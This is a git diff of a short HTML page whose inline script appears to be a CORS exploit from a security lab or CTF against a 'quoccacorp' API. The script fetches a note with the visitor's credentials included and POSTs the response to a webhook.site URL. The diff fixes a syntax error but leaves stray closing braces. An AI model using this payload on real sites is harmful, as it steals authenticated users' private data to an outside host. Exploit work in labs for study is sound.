@@ -2,15 +2,17 @@
 <html>
   <body>
     <script>
-      fetch("https://cors-api.quoccacorp.com/note?cors-allow-origin=https://cors-api.quoccacorp.com"
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        fetch("https://webhook.site/d8b657ed-2e46-44b4-b20c-82b11deec8ff", {
-          method: "POST",
-          mode: "no-cors",
-          body: data
+      fetch("https://cors-api.quoccacorp.com/note?cors-allow-origin=https://cors-api.quoccacorp.com", {
+    credentials: "include"
+})
+.then(res => res.text())
+.then(data => {
+    fetch("https://webhook.site/d8b657ed-2e46-44b4-b20c-82b11deec8ff", {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+    });
+});
         });
       });
     </script>
